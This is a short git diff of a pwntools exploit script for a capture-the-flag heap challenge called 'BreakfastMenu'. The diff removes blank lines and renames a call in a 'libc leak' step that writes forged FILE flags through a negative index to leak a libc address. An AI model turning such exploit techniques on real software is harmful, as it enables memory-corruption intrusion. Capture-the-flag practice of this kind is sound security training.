@@ -6,7 +6,6 @@ from pwn import *
 BINARY = './BreakfastMenu'
 elf  = ELF(BINARY)
 
-
 if len(sys.argv) > 1 and sys.argv[1] == 'r':
   HOST = "breakfast.sdc.tf"
   PORT = 1337
@@ -16,7 +15,6 @@ else:
   s = process(BINARY)
   heap_offset = 0x1700
 libc = elf.libc
-
 
 def Create():
   s.sendlineafter("leave\n", "1")
@@ -72,7 +70,7 @@ Create()
 
 # libc leak
 Delete(11)
-Edit_S(-12, p32(0xfbad3a87)+"\x01"*0x1b)
+Edit(-12, p32(0xfbad3a87)+"\x01"*0x1b)
 s.recvuntil("A"*8)
 s.recv(8)
 libc_leak = u64(s.recv(8))
